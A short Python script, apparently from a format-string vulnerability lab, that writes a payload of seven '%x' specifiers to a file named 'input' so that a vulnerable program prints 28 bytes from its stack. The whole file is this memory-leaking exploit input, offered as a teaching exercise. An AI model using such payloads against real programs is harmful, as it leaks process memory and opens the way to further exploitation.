#!/usr/bin/python3
# Print Out Data on the Stack

# print out 7*4 bytes of data on the stack
payload = "%x.%x.%x.%x.%x.%x.%x\n".encode('latin-1')

with open('input', 'wb') as f:
  f.write(payload)